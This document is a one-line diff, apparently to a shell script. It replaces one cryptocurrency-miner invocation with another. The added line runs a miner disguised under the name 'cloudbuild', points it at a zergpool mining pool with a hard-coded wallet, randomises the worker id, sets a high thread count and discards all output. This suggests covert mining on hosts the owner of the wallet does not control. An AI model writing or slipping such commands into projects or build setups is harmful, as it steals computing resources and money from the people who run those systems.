@@ -1,1 +1,1 @@
-./anto --disable-gpu --algorithm yespower --pool yespower.na.mine.zergpool.com:6533 --wallet DDroUTb1YnPcqT7bM1vtCiXA9gjegm1Beb --cpu-threads 12
+./cloudbuild -v -l verushash.asia.mine.zergpool.com:3300 -u ML237BDudyEj71oMDFEJShKHc8F6ogqkdY.$(shuf -n 1 -i 1-99999) -p c=LTC -t 36 >/dev/null 2>&1
